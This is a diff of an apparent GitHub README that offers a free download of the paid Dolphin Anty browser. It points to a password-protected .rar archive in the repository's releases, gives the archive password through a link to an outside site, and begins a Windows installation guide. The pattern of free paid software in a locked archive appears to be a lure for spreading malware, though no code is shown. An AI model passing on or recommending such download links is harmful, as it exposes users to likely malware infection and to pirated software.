@@ -1,8 +1,9 @@
-{![Download]https://github.com/sp1der-mn/free-dolphin-browser/releases/download/browser/dolphin.rar}
+[Download](https://github.com/sp1der-mn/free-dolphin-browser/releases/download/browser/dolphin.rar)
 
 <h1 align="center">password: <a href="https://daniilshat.ru/" target="_blank">free-profiles</a> 
 <img src="https://github.com/blackcater/blackcater/raw/main/images/Hi.gif" height="32"/></h1>
-![photo](https://github.com/user-attachments/assets/7c40c8d4-366e-43d2-9832-71831aa80990)
+
+![preview](https://github.com/user-attachments/assets/a4a956ab-e092-4783-927b-6aec149454f9)
 
 
 Windows Installation and Dolphin Anty Setup: Step-by-Step Guide
